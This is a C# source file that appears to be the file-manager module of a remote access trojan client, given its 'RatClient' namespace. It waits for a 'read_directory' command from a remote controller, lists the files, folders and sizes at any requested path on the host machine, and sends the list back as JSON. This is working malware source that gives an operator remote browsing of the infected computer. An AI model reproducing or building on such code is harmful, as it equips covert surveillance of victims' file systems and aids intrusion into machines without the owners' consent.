using System;
using System.Collections.Generic;
using System.Web.Script.Serialization;
using System.IO;

namespace RatClient.Features
{
    public class FileManager
    {
        #region Variables
        private Action<object> sendJson;
        #endregion

        #region Constructor
        public FileManager(Action<object> sendJson)
        {
            this.sendJson = sendJson;

            Program.MessageReceived += HandleMessage;
        }
        #endregion

        #region Methods
        private void HandleMessage(dynamic jsonMessage)
        {
            if (jsonMessage["type"] == "read_directory")
            {
                string filesAndFolders = GetFilesAndFolders(jsonMessage["path"]);
                if (!string.IsNullOrEmpty(filesAndFolders))
                {
                    sendJson(new { type = "files_and_folders", filesAndFolders });
                }
            }
        }

        public string GetFilesAndFolders(string path)
        {
            Dictionary<string, object> items = new Dictionary<string, object>();
            if (!Directory.Exists(path))
            {
                return "";
            }

            foreach (var directory in Directory.GetDirectories(path, "*", SearchOption.TopDirectoryOnly))
            {
                DirectoryInfo dirInfo = new DirectoryInfo(directory);
                items[dirInfo.Name] = new { Type = "DIRECTORY", Size = "N/A" };
            }
            foreach (var file in Directory.GetFiles(path, "*", SearchOption.TopDirectoryOnly))
            {
                FileInfo fileInfo = new FileInfo(file);
                items[fileInfo.Name] = new { Type = "FILE", Size = fileInfo.Length.ToString() };
            }

            return new JavaScriptSerializer().Serialize(items);
        }
        #endregion
    }
}